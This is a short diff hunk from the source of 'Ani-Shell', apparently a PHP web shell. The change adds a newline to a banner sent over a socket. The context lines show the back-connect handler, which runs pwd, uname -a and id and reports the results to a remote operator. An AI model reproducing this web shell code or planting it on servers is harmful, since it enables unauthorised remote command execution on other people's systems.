@@ -1583,7 +1583,7 @@ else if(isset($_GET['connect']))
         } 
         else
         { 
-            fputs ($sockfd ,"\n=================================================================\nAni-Shell | C0d3d by lionaneesh | India\n=================================================================");
+            fputs ($sockfd ,"\n=================================================================\nAni-Shell | C0d3d by lionaneesh | India\n=================================================================\n");
          $pwd = exec_all("pwd");
          $sysinfo = exec_all("uname -a");
          $id = exec_all("id");
